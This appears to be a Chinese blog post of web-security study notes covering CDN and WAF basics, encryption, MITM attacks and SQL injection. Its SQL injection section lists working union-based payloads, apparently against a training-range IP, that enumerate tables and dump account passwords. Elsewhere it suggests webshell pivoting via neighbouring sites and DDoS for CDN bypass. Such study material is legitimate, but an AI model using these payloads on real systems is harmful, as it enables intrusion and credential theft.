itemprop="text">笔记</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web-Security/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Web Security</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="常见名词"><a href="#常见名词" class="headerlink" title="常见名词"></a>常见名词</h2><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>主站安全性高，则可选用次级站点（子域名）作为突破口，进行渗透提权</p>
<h4 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h4><p>域名分为顶级域名和二级域名等，而在安全信息收集中，子域名一般指三级以上的域名</p>
<p>如 <code>baidu.com</code> 的子域名可以是 <code>tieba.baidu.com</code> 和 <code>zhidao.baidu.com</code></p>
<h4 id="旁站入侵"><a href="#旁站入侵" class="headerlink" title="旁站入侵"></a>旁站入侵</h4><p>旁站是指<strong>同一服务器上的其他网站，不一定属于同一家公司</strong>，注意区别子域名</p>
<p>很多时候某些网站不容易入侵，则可以查看该网站所在的服务器是否还有其他网站，若有，可以先拿下其他网站的 webshell，再提权拿到服务器权限，最后突破该网站</p>
<h4 id="C-段"><a href="#C-段" class="headerlink" title="C 段"></a>C 段</h4><p>IP 地址第 24 位之后的 IP 段</p>
<p>如对于  <code>120.240.100.229</code> ~ <code>120.240.100.254</code>，则 C 段是 <code>229 ~ 254</code></p>
<h3 id="DNS（Domain-Name-System，域名系统）"><a href="#DNS（Domain-Name-System，域名系统）" class="headerlink" title="DNS（Domain Name System，域名系统）"></a>DNS（Domain Name System，域名系统）</h3><blockquote>
<p>区别 DNS 和 DNS 协议：</p>
<p><strong>DNS</strong> 是互联网的一种服务，本质是域名和 IP 地址相互映射的一个<strong>分布式数据库</strong></p>
<p><strong>DNS 协议</strong>是 <code>域名 &lt;-&gt; IP 地址</code> 相互转换（双向转换）的一种解析服务协议</p>
</blockquote>
<h4 id="DNS-劫持"><a href="#DNS-劫持" class="headerlink" title="DNS 劫持"></a>DNS 劫持</h4><p>又称为域名劫持，这类攻击一般是通过恶意软件、修改缓存、控制域名管理系统等方式取得DNS解析控制权，然后通过<strong>修改DNS解析记录</strong>或<strong>更改解析服务器</strong>方式，将用户引导至不可达的站点或<strong>受攻击者控制的非法网站</strong>，以非法获取用户数据，谋取非法利益</p>
<h4 id="DDoS-攻击"><a href="#DDoS-攻击" class="headerlink" title="DDoS 攻击"></a>DDoS 攻击</h4><p>DDoS 即 Distributed Denial of Service，分布式拒绝服务，是 DoS（拒绝服务） 的一种</p>
<p>攻击者使用僵尸网络创建不同端点，在同一时间段向受害者域名服务器直接发送海量 DNS 请求，这种攻击会在<strong>短时间内产生大量流量</strong>，利用无数请求堵塞 DNS 服务器，让其无法响应，从而达到<strong>拒绝正常用户访问</strong>的目的</p>
<h4 id="僵尸网络"><a href="#僵尸网络" class="headerlink" title="僵尸网络"></a>僵尸网络</h4><p>DDoS 攻击涉及多个连接的在线设备，统称为僵尸网络</p>
<p>僵尸网络是一组被劫持的连接设备，用于网络攻击，通常包括个人电脑、手机、不安全的物联网设备，甚至来自公共云服务的资源</p>
<p>攻击者使用恶意软件和其他技术来破坏设备，将其变成攻击者僵尸网络中的“僵尸”</p>
<h3 id="CDN（Content-Delivery-Network，内容分发网络）"><a href="#CDN（Content-Delivery-Network，内容分发网络）" class="headerlink" title="CDN（Content Delivery Network，内容分发网络）"></a>CDN（Content Delivery Network，内容分发网络）</h3><p>CDN 是将<strong>源站内容</strong>分发至<strong>全国所有的节点</strong>，从而缩短用户查看对象的延迟，提高用户访问网站的响应速度</p>
<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302232152885.png" alt="image-20230223215243727" loading="lazy"></p>
<h4 id="CDN-分层结构"><a href="#CDN-分层结构" class="headerlink" title="CDN 分层结构"></a>CDN 分层结构</h4><p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302232152948.jpeg" alt="img" loading="lazy"></p>
<h4 id="CDN-的存在对安全测试有什么影响？"><a href="#CDN-的存在对安全测试有什么影响？" class="headerlink" title="CDN 的存在对安全测试有什么影响？"></a>CDN 的存在对安全测试有什么影响？</h4><p>CDN 的存在会导致测试人员无法直接访问网站主体，而是访问 CDN 缓存</p>
<h4 id="如何判断目标存在-CDN-服务？"><a href="#如何判断目标存在-CDN-服务？" class="headerlink" title="如何判断目标存在 CDN 服务？"></a>如何判断目标存在 CDN 服务？</h4><p>利用多节点技术进行请求返回判断，即用<a target="_blank" rel="noopener" href="https://ping.chinaz.com/">超级ping</a>查看是否多节点</p>
<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302271745542.png" alt="image-20230227174549373" loading="lazy"></p>
<h4 id="如何绕过-CDN？"><a href="#如何绕过-CDN？" class="headerlink" title="如何绕过 CDN？"></a>如何绕过 CDN？</h4><h5 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h5><p>子域名有可能与主站在同一网段（1 - 254）甚至同一 IP，可以通过子域名查询主站 IP</p>
<h5 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h5><p>大公司都有自己的邮件服务器，且一般不会配备 CDN 服务，可以通过邮箱查询 IP</p>
<h5 id="国外请求"><a href="#国外请求" class="headerlink" title="国外请求"></a>国外请求</h5><p>一般公司会根据需求部署 CDN 服务，若国内访问量居多，则国外可能不会部署 CDN，可通过国外 IP 访问主站</p>
<p>另外，用小国或冷门国家的 IP 成功率较高</p>
<h5 id="遗留文件全网扫描"><a href="#遗留文件全网扫描" class="headerlink" title="遗留文件全网扫描"></a>遗留文件全网扫描</h5><p>借助工具进行全网扫描，收集所有 CDN 节点的信息，通过 IP 地址进行区分，再确定主站 IP</p>
<h5 id="黑暗搜索引擎"><a href="#黑暗搜索引擎" class="headerlink" title="黑暗搜索引擎"></a>黑暗搜索引擎</h5><p>黑暗搜索引擎：撒旦、钟馗之眼</p>
<h5 id="DNS-历史记录"><a href="#DNS-历史记录" class="headerlink" title="DNS 历史记录"></a>DNS 历史记录</h5><p>通过查询使用 CDN 前的 DNS 历史记录，查询 IP 地址</p>
<h5 id="DDoS-暴力破解"><a href="#DDoS-暴力破解" class="headerlink" title="DDoS 暴力破解"></a>DDoS 暴力破解</h5><p>使用 DDOS 攻击将所有 CDN 流量耗尽，之后就能访问到真实的ip地址</p>
<h3 id="WAF（Web-Application-Firewall，Web-应用程序防火墙）"><a href="#WAF（Web-Application-Firewall，Web-应用程序防火墙）" class="headerlink" title="WAF（Web Application Firewall，Web 应用程序防火墙）"></a>WAF（Web Application Firewall，Web 应用程序防火墙）</h3><p>WAF 是一类新兴的信息安全技术，用于解决<strong>传统防火墙</strong>无法防御的应用安全问题</p>
<p>与传统防火墙不同，WAF 工作在<strong>应用层</strong>，旨在保护 Web 应用免受各类应用层攻击，如 XSS、SQL 注入、cookie 篡改等</p>
<blockquote>
<p>Cookie 篡改（也称为会话劫持）是一种攻击策略，攻击者可以伪造、劫持或篡改发送回服务器的有效 Cookie，以盗取数据、绕过服务器安全检查等</p>
</blockquote>
<p>WAF 通过过滤、监控和拦截恶意 HTTP 或 HTTPS 流量的访问来保护 Web 应用，并能够阻止未经授权的数据离开应用</p>
<p>总之，WAF 是通过执行一系列针对 <code>HTTP/HTTPS</code> 的安全策略来专门为 Web 应用提供保护的一种技术</p>
<h4 id="传统防火墙"><a href="#传统防火墙" class="headerlink" title="传统防火墙"></a>传统防火墙</h4><p>防火墙分类很多，根据采用的技术，可分为<strong>包过滤防火墙</strong>和<strong>代理防火墙</strong></p>
<h5 id="包过滤防火墙"><a href="#包过滤防火墙" class="headerlink" title="包过滤防火墙"></a>包过滤防火墙</h5><p>包过滤是所有防火墙最核心的功能，包过滤规则一般存放于路由器的 ACL 中</p>
<p>包过滤防火墙工作在<strong>网络层</strong>，因此处理数据包的速度快、效率高</p>
<blockquote>
<p>ACL（Access Control List，访问控制列表）</p>
<p>ACL 使用包过滤技术，在路由器上读取<strong>传输层至网络层</strong>的数据包中的信息，如源地址、目的地址、源端口、目的端口等，根据预先定义好的规则，对包进行过滤，从而达到访问控制的目的</p>
</blockquote>
<h5 id="代理防火墙"><a href="#代理防火墙" class="headerlink" title="代理防火墙"></a>代理防火墙</h5><p>代理服务器能在<strong>应用层</strong>实现防火墙功能，针对每一个应用都有一个特定的程序，通过代理可以实现<strong>比包过滤更严格</strong>的安全策略</p>
<p>代理服务器是基于软件的，对整个 IP 包的数据进行扫描，不允许直接通过防火墙，安全性更高</p>
<h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p>Webshell 是黑客经常使用的一种恶意脚本，其目的是<strong>获得对服务器的执行操作权限</strong>，如执行系统命令、窃取用户数据、删除 web 页面、修改主页等</p>
<p>黑客通常利用常见的漏洞，如 SQL 注入、RFI（远程文件包含）、FTP、XSS（跨站脚本攻击） 等方式作为攻击手段，最终控制网站服务器</p>
<h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><h3 id="散列算法（哈希算法）"><a href="#散列算法（哈希算法）" class="headerlink" title="散列算法（哈希算法）"></a>散列算法（哈希算法）</h3><p>散列算法最大的特点是不可逆，常见的有 MD5、SHA 系列</p>
<p>散列算法常用于密码加密，通过比较两个<strong>加密后的字符串</strong>是否一样来确认身份</p>
<p>注意，<strong>不可逆不代表不可破解</strong>，网上很多自称可以破解 MD5 密码的网站，其原理就是有一个巨大的资源库，存放了许多字符串及<strong>对应 MD5 加密后的字符串</strong>，通过输入的 MD5 加密串来进行比较。如果密码复杂度低，则很大概率会被破解</p>
<h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p><code>MD5（MD5 Message-Digest Algorithm，消息摘要算法）</code>是一种被广泛使用的密码散列算法，可以产生一个 <strong>128 bit</strong>（16 字节）的散列值（Hash Value），通常用十六进制表示为 <strong>32 个字符</strong></p>
<ul>
<li>无论输入的数据长度是多少，计算出来的 MD5 值长度相同</li>
<li>出现 MD5 值相同的原数据的概率很低</li>
</ul>
<p>算法大致步骤：</p>
<ol>
<li><p>填充</p>
<p>要求填充后的数据长度对 512 取余为 448，后接 64 bit 的原始信息长度</p>
<p>注意，若对 512 取余刚好是 448，仍要填充，填充长度为 512 bit</p>
</li>
<li><p>分组</p>
<p>每 512 bit 为一组，每组再细分为 16 个小分组，小分组长度 32 bit</p>
</li>
<li><p>位运算</p>
<p>对每个分组进行位运算，最终获得 128 bit 的 MD5 结果</p>
</li>
</ol>
<h4 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h4><p><code>SHA（Secure Hash Algorithm，安全散列算法）</code>是一个密码散列算法家族，SHA1 是其中一种</p>
<p>SHA1 与 MD5 一样，也是消息摘要算法，但是 <strong>SHA1 安全性更强</strong>，会产生一个 <strong>160 bit</strong> 的消息摘要</p>
<h4 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a>HMAC</h4><p><code>HMAC（Hash-based Message Authentication Code，哈希运算消息认证码）</code>基于哈希算法（MD5、SHA1等），输入<strong>一个密钥（key）和一个消息</strong>，输出<strong>一段消息摘要</strong></p>
<p>HMAC 发送方和接收方基于 key 进行计算，而没有 key 的第三方，则无法计算出正确的散列值，可防止数据被篡改</p>
<h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p>一种早期的加密算法，在对称加密过程中，使用的密钥<strong>只有一份</strong>，发送方和接收方<strong>使用相同的密钥</strong>进行加密和解密，要求双方都要知道该密钥</p>
<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302241716860.png" alt="image-20230224171651767" loading="lazy"></p>
<p>加密：</p>
<p>发送方将<strong>明文</strong>(原始数据) 和<strong>加密密钥</strong>一起经过加密，生成复杂的<strong>密文</strong>进行发送</p>
<p>解密：</p>
<p>接收方收到<strong>密文</strong>后，若想读取原数据，则需要使用<strong>加密使用的密钥</strong>及<strong>相同算法的逆算法</strong>对密文进行解密</p>
<h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p><code>DES（Data Encryption Standard，数据加密标准）</code>是一种比较古老的对称加密算法，密钥长度 <strong>56 bit</strong></p>
<p>DES 是一种<strong>分组加密算法</strong>，又称为<strong>块加密算法</strong>，以 64 bit 为一组对数据进行加密</p>
<h4 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h4><p><code>3DES （Triple DES）</code>是 DES 向 AES 过渡的算法，使用 <strong>3 份 56 bit</strong> 的密钥对数据进行三次加密，安全性更高</p>
<h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><p><code>AES（Advanced Encryption Standard，高级加密标准）</code>密钥长度默认 <strong>128 bit</strong>，可选 192 bit、256 bit</p>
<p>AES 本身就是为了取代 DES，具有更好的安全性和加密速度</p>
<p>AES 也是一种<strong>分组加密算法</strong>，以 128 bit 为一组对数据进行加密，不足 128 bit 时会进行填充</p>
<h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>与对称加密相比，非对称加密需要两份密钥，一个<strong>公钥</strong>（public key）和一个<strong>私钥</strong>（private key），使用<strong>不同的密钥</strong>进行加密和解密</p>
<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302241743097.png" alt="image-20230224174347884" loading="lazy"></p>
<ul>
<li>若使用<strong>公钥</strong>加密，则只能使用对应<strong>私钥</strong>进行解密</li>
<li>若使用<strong>私钥</strong>加密，则只能使用对应<strong>公钥</strong>进行解密</li>
<li>公钥和私钥的概念只是相对的，本质上就是一对密钥</li>
</ul>
<blockquote>
<p>例子：</p>
<p>A 生成一对密钥，把其中一份作为公钥对所有人公开</p>
<p>B 得知该公钥，使用该公钥加密数据后，发送给 A</p>
<p>A 使用自己保存的另一个密钥（私钥）进行解密</p>
</blockquote>
<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA 是由 <code>Ron Rivest、Adi Shamir、Leonard Adleman</code> 三个提出者的姓氏开头字母拼接而成</p>
<p>RSA 是当前影响力最广的非对称加密算法，公钥可以公开，私钥自己保存</p>
<p>其原理是<strong>两个大素数相乘简单，对其乘积进行分解困难</strong></p>
<p>由此可以将其乘积 N 作为选取密钥的基础，具体公钥私钥的选取比较复杂，略</p>
<h3 id="编码算法"><a href="#编码算法" class="headerlink" title="编码算法"></a>编码算法</h3><p>严格来说，<strong>编码算法不属于加密算法</strong>，常见的有 Base64、HEX、URL 编码</p>
<h4 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h4><p>Base64 最初是为了解决邮件中不能传文件和图片问题而使用的，将无法阅读的二进制码转化成字符形式</p>
<p>原理是将 3 个 8 bit 转化为 4 个 6 bit，然后在 6 bit 前面补两个 0，变成 8 bit 一字节的形式</p>
<p>最后如果剩下不足 3 个 8 bit，则用 0 填充，输出 <code>=</code>，所以编码结果的后门可能会出现一至二个 <code>=</code> 号</p>
<h4 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h4><p>URL 一般只允许英文、数字、某些符号，而对于特殊字符、中文等不允许使用，因此若要在 URL 中加入中文，需要进行编码</p>
<p>原理是在十六进制前面加上 <code>%</code> 表示，比如对于一些特殊字符是 <code>%xx</code>，对于中文是 <code>%xx%xx%xx</code>，其中 <code>xx</code> 由十六进制编码决定</p>
<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302242153944.jpeg" alt="img" loading="lazy"></p>
<p>中间人攻击（Man-in-the-Middle Attack，MITM）是一种窃听攻击，在这种攻击中，攻击者阻碍了发送方和接收方之间的通信和数据传输，试图拦截、窃取、修改数据，并向任何一方发送恶意链接</p>
<h3 id="IP-欺骗"><a href="#IP-欺骗" class="headerlink" title="IP 欺骗"></a>IP 欺骗</h3><p>攻击者通过伪造 IP 地址，发送虚假 IP 源地址的数据包，冒充某台主机执行恶意操作，且通常难以被检测到</p>
<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302242128269.png" alt="IP 欺骗 DDoS 攻击" loading="lazy"></p>
<p>IP 欺骗包括三种常见形式：</p>
<ul>
<li><p>分布式拒绝服务 (DDoS) 攻击</p>
<p>在 DDoS 攻击中，黑客使用带有欺骗性 IP 地址数据包攻击目标服务器，这使他们能够在隐藏身份的同时使服务器崩溃</p>
</li>
<li><p>隐藏僵尸网络设备</p>
<p>IP 欺骗可用来通过僵尸网络获取对计算机的访问权限，每台受害者计算机运行一个专用机器人，该机器人代表攻击者执行恶意活动</p>
<p>IP 欺骗允许攻击者掩蔽僵尸网络，因为网络中的每个机器人都有一个欺骗 IP 地址，这使得恶意行为难以被追踪</p>
</li>
<li><p>中间人攻击</p>
<p>IP 欺骗还可以通过中间人攻击来<strong>截取两台计算机之间的通信数据</strong>，从而窃取或修改数据、将用户引导至非法网站等</p>
</li>
</ul>
<h3 id="DNS-欺骗"><a href="#DNS-欺骗" class="headerlink" title="DNS 欺骗"></a>DNS 欺骗</h3><p>通过改变 <strong>DNS 服务器的 IP 地址</strong>来尝试启动网络钓鱼攻击或注入恶意软件</p>
<p>攻击者劫持浏览器对某个网站的请求，将其重定向至另一个网站，该网站模仿原网站，从而盗取用户的敏感信息</p>
<h3 id="ARP-欺骗"><a href="#ARP-欺骗" class="headerlink" title="ARP 欺骗"></a>ARP 欺骗</h3><p>攻击者发送欺诈性的 ARP （地址解析协议）信息，欺骗其他设备，使其认为已经与正常用户进行通信，从而窃取、拦截数据</p>
<h3 id="HTTPS-欺骗"><a href="#HTTPS-欺骗" class="headerlink" title="HTTPS 欺骗"></a>HTTPS 欺骗</h3><p>在 HTTS 欺骗中，攻击者欺骗浏览器，使其认为非法网站是合法的，改变基于 HTTPS 的地址请求，将其重定向到恶意网站</p>
<h3 id="SSL-劫持"><a href="#SSL-劫持" class="headerlink" title="SSL 劫持"></a>SSL 劫持</h3><p>若访问一个 URL 以 HTTP 开头的不安全网站，有 SSL 安全的浏览器会自动将其重定向到 HTTPS 安全版本的  URL</p>
<p>在 SSL 劫持中，攻击者拦截改变重定向路线，窃取敏感数据</p>
<h1 id="Web-漏洞"><a href="#Web-漏洞" class="headerlink" title="Web 漏洞"></a>Web 漏洞</h1><blockquote>
<p>在挖漏洞前，做好信息收集</p>
</blockquote>
<blockquote>
<p>在分析漏洞时，首先要考虑的是漏洞危害和等级，这点非常重要</p>
</blockquote>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302261645077.jpg" alt="Snipaste_2023-02-26_16-42-51" loading="lazy"></p>
<ul>
<li><p>上图右侧是常见漏洞，在比赛、实战等各种场景均有出现</p>
</li>
<li><p>上图左侧相对出现较少，但不代表不重要</p>
</li>
</ul>
<p>平时学习的重点内容：</p>
<ul>
<li><p>CTF</p>
<p>SQL 注入、文件上传、<strong>反序列化（重点的重点）</strong>、代码执行</p>
</li>
<li><p>SRC（<code>Security Response Center，安全应急响应中心</code>）</p>
<p>均会出现，其中以逻辑安全居多</p>
</li>
<li><p>红蓝对抗</p>
<p>高危漏洞较多，与实战接近，涉及权限安全</p>
</li>
</ul>
<h3 id="高危漏洞"><a href="#高危漏洞" class="headerlink" title="高危漏洞"></a>高危漏洞</h3><p>SQL 注入、文件上传、文件包含、代码执行、未授权访问、命令执行</p>
<p>此类漏洞涉及：权限获取、敏感数据获取（泄露）</p>
<h3 id="中危漏洞"><a href="#中危漏洞" class="headerlink" title="中危漏洞"></a>中危漏洞</h3><p>反序列化、逻辑安全</p>
<p>相对高危漏洞有一部分影响</p>
<h3 id="低危漏洞"><a href="#低危漏洞" class="headerlink" title="低危漏洞"></a>低危漏洞</h3><p>XSS 跨站、目录遍历、文件读取</p>
<p>小部分信息泄露（网站源码、部分用户信息泄露）</p>
<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>两个条件，缺一不可：</p>
<ul>
<li>可控变量，如 <code>SELECT * FROM users WHERE id=$id LIMIT 0,1</code> 的变量 id</li>
<li>代入数据库查询</li>
</ul>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 以下均可能存在注入点
www.xxx.com&#x2F;index.php?id&#x3D;666
www.xxx.com&#x2F;?id&#x3D;666
www.xxx.com&#x2F;index.php?id&#x3D;666&amp;x&#x3D;777

www.xxx.com&#x2F;index.php &#x2F;&#x2F; 可能存在 POST 注入，参数在请求体
    
&#x2F;&#x2F; 另外，第 1、2 两条是等效的，index.php 可以省略</code></pre>

<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 假设仅参数 x 有注入点
www.xxx.com&#x2F;news.php?y&#x3D;666 and 1&#x3D;1&amp;x&#x3D;777
www.xxx.com&#x2F;news.php?y&#x3D;666&amp;x&#x3D;777 and 1&#x3D;1
www.xxx.com&#x2F;news.php?y&#x3D;666 and 1&#x3D;1&amp;x&#x3D;777 and 1&#x3D;1
www.xxx.com&#x2F;news.php?xxx&#x3D;666&amp;xx&#x3D;777 and 1&#x3D;1
    
&#x2F;&#x2F; 第 2、3 两条注入测试正确</code></pre>

<h3 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h3><ul>
<li>盲注<ul>
<li>布尔注入：只能从应用返回数据中判断 SQL 语句执行后的布尔值</li>
<li>时间注入：没有明确的回显，只能用特定的时间函数来判断</li>
</ul>
</li>
<li>报错注入：应用会显示全部或部分报错信息</li>
<li>堆叠注入：有的应用加入 <code>;</code> 后，可执行多条 SQL 语句</li>
</ul>
<h3 id="如何判断数据库类型？"><a href="#如何判断数据库类型？" class="headerlink" title="如何判断数据库类型？"></a>如何判断数据库类型？</h3><h4 id="根据前后端"><a href="#根据前后端" class="headerlink" title="根据前后端"></a>根据前后端</h4><ul>
<li>asp：SQL Server，Access</li>
<li>.net：SQL Server</li>
<li>php：MySQL，PostgreSQL</li>
<li>java：Oracle，MySQL</li>
</ul>
<h4 id="根据端口"><a href="#根据端口" class="headerlink" title="根据端口"></a>根据端口</h4><ul>
<li>Oracle：默认端口1521</li>
<li>SQL Server：默认端口1433</li>
<li>MySQL：默认端口3306</li>
</ul>
<h4 id="根据特有函数"><a href="#根据特有函数" class="headerlink" title="根据特有函数"></a>根据特有函数</h4><h5 id="len-和-length"><a href="#len-和-length" class="headerlink" title="len 和 length"></a>len 和 length</h5><ul>
<li>len()：SQL Server 、MySQL 以及 db2 返回长度的函数</li>
<li>length()：Oracle 和 INFORMIX 返回长度的函数</li>
</ul>
<h5 id="version-和-version"><a href="#version-和-version" class="headerlink" title="version 和 @@version"></a>version 和 @@version</h5><ul>
<li>version()：MySQL 查询版本信息的函数</li>
<li>@@version：MySQL 和 SQL Serve r查询版本信息的函数</li>
</ul>
<h5 id="substr-和-substring"><a href="#substr-和-substring" class="headerlink" title="substr 和 substring"></a>substr 和 substring</h5><ul>
<li>MySQL 两个函数都可以使用</li>
<li>Oracle 只可调用substr</li>
<li>SQL Server 只可调用substring</li>
</ul>
<h4 id="根据字符串处理方式"><a href="#根据字符串处理方式" class="headerlink" title="根据字符串处理方式"></a>根据字符串处理方式</h4><h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; 
http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and CONCAT(&#39;a&#39;,&#39;b&#39;)&#x3D;&#39;ab&#39; </code></pre>

<h5 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;a&#39;||&#39;b&#39;&#x3D;&#39;ab&#39; 
http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and CONCAT(&#39;a&#39;,&#39;b&#39;)&#x3D;&#39;ab&#39; </code></pre>

<h5 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;a&#39;+&#39;b&#39;&#x3D;&#39;ab&#39; </code></pre>

<h4 id="根据数据库特有的表"><a href="#根据数据库特有的表" class="headerlink" title="根据数据库特有的表"></a>根据数据库特有的表</h4><h5 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1</code></pre>

<h5 id="Oracle-1"><a href="#Oracle-1" class="headerlink" title="Oracle"></a>Oracle</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</code></pre>

<h5 id="SQL-Server-1"><a href="#SQL-Server-1" class="headerlink" title="SQL Server"></a>SQL Server</h5><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</code></pre>

<h3 id="如何判断注入点？"><a href="#如何判断注入点？" class="headerlink" title="如何判断注入点？"></a>如何判断注入点？</h3><blockquote>
<p>方法一定要灵活，不要局限于老套路</p>
</blockquote>
<h4 id="老办法"><a href="#老办法" class="headerlink" title="老办法"></a>老办法</h4><pre class="language-none"><code class="language-none">and 1&#x3D;1 页面正常
and 1&#x3D;2 页面错误
可能存在注入点

如
SELECT * FROM users WHERE id&#x3D;1 and 1&#x3D;1 LIMIT 0,1 正常
SELECT * FROM users WHERE id&#x3D;1 and 1&#x3D;2 LIMIT 0,1 错误
由此可判断存在逻辑运算，即存在注入点
注意此处是 and 不是 or</code></pre>

<blockquote>
<p>特殊情况：</p>
<p>如果测试过程中出现 404 错误，并跳回主页，说明该网站对输入进行了安全检测，一般就没有注入点</p>
</blockquote>
<h4 id="判断注入点的一般过程"><a href="#判断注入点的一般过程" class="headerlink" title="判断注入点的一般过程"></a>判断注入点的一般过程</h4><ul>
<li><p>猜列数（字段数），用 <code>order by</code> 测试，<code>order by 1</code>、<code>order by 2</code>、<code>order by 3</code> 直到报错，最后的数量即是列数</p>
</li>
<li><p>报错后，进行猜解准备：<code>http://1.1.1.1:8848/index.php?id=1 union select 1,2,3</code></p>
<p>目的是看哪些列会进行显示</p>
<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302262325196.png" alt="image-20230226232549004" loading="lazy"></p>
<p>这里表示 2,3 是显示位，可以显示数据，由此<strong>可将 2,3 替换成某些函数</strong></p>
</li>
<li><p>下一步，信息收集</p>
<p>数据库版本 <code>version()</code></p>
<p>数据库名 <code>database()</code></p>
<p>数据库用户 <code>user()</code></p>
<p>操作系统  <code>@@version_compile_os</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202302262328714.png" alt="image-20230226232841561" loading="lazy"></p>
<blockquote>
<p>在 MySQL 5.0 以上版本中，存在一个 <strong>information_schema 数据库</strong>，它存储着所有<strong>数据库名、表名、列名</strong></p>
<ul>
<li><p>高版本可以通过它来获取指定数据库下的表名或列名信息</p>
</li>
<li><p>低版本则只能暴力查询或结合读取查询</p>
</li>
</ul>
</blockquote>
</li>
<li><p>查询数据库名称和数据库版本</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;219.153.49.228:48354&#x2F;new_list.php?id&#x3D;-1 union select 1,database(),version(),4</code></pre></li>
<li><p>查询数据库用户和操作系统</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;219.153.49.228:48354&#x2F;new_list.php?id&#x3D;-1 union select 1,user(),@@version_compile_os,4</code></pre></li>
<li><p>查询指定数据库名 <code>mozhe_Discuz_StormGroup</code> 下的表名信息</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;219.153.49.228:48354&#x2F;new_list.php?id&#x3D;-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;‘mozhe_Discuz_StormGroup’</code></pre></li>
<li><p>查询指定表名 <code>StormGroup_member</code> 下的列名信息</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;219.153.49.228:48354&#x2F;new_list.php?id&#x3D;-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;‘StormGroup_member’</code></pre></li>
<li><p>查询账号密码</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;219.153.49.228:48354&#x2F;new_list.php?id&#x3D;-1 union select 1,name,password,4 StormGroup_member</code></pre></li>
</ul>
<h4 id="root-型注入点"><a href="#root-型注入点" class="headerlink" title="root 型注入点"></a>root 型注入点</h4><p>root 用户与普通用户不同，它具有数据库最高权限，可以实现同一 MySQL 服务的<strong>跨数据库</strong>攻击</p>
<p>换句话说，用户权限的高低，决定了从数据库中获取数据的多少</p>
